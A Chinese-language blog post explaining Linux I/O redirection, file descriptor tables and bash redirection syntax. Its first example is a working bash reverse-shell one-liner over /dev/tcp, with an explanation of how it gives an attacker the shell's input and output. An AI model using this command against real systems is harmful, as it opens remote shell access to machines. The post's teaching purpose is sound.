---
layout: post
title: Linux I/O重定向
---

## Info
Linux中重定向是很有趣的一部分，今天就在这进行一下整理。

### 标准I/O
Linux中每个进程都有STDIN、STDOUT和STDERR中三种标准I/O，相应的，几乎所有语言都有标准的I/O函数。

### 文件描述符
对于Linux来说，每一个打开的文件都对应着一个文件描述符（File Descriptor， 简称FD）。内核维护一个File descriptor table，该表已FD为索引，指向维护所有进程所打开文件的File table， 该表记录了文件打开的模式，而该表又指向Inode table，也就是实际的文件：

![Alt text](/images/file_table_and_inode_table.png)

当进程需要访问文件时，首先把FD传给内核，内核根据FD在文件描述符表中找到实际指向的文件并进行操作，再将操作完成后的FD传给进程，整个过程进程并不直接操作文件。

在进程创建时，进程默认拥有0、1和2三个FD，分别指向STDIN、STDOUT和STDERR。

### 重定向
在Linux中，重定向实际定向的是File descriptor table的指向。进程只关心FD，而并不关心FD所索引的表项所指向的具体文件。

### Bash Redirection
bash中使用`>`等符号来进行重定向，[基本用法请看这里](http://www.cnblogs.com/zhoug2020/archive/2012/06/26/2563117.html)，下面以两个例子介绍几个特殊用法以及注意事项：

#### 0x00

```bash
bash -i >& /dev/tcp/127.0.0.1/8080 0>&1
```

经典的一句话反弹shell，首先利用`>&`将bash的STDOUT和STDERR重定向到`/dev/tcp/127.0.0.1/8080`这个文件中，这是bash所维护的仅用于重定向中的一个特殊文件，当对此文件进行输入时，如果目标地址可达，则与目标建立socket连接。接着再执行`0>&1`，将bash的STDIN重定向到STDOUT的位置，因为此时STDOUT目前被重定向到上述文件中，从而使STDIN也重定向到同一文件，最后攻击方可同时获得bash的输入输出。

值得注意的有以下几点：

- 为何不是`0>1`而是`0>&1`，因为加上`&`代表1为FD，不加则为一个文件名
- 重定向执行的顺序很重要，若先执行`0>&1`，在`... >& ...`后STDIN依旧指向的是之前STDOUT的位置，并没有重定向到连接上。

#### 0x01

```bash
exec 9<>/dev/tcp/127.0.0.1/8080
```

此处打开文件，并利用9作为FD对其进行输入和输出。需要注意的是尽量不要使用大于9的FD进行重定向，有可能跟bash自己拥有的FD冲突。

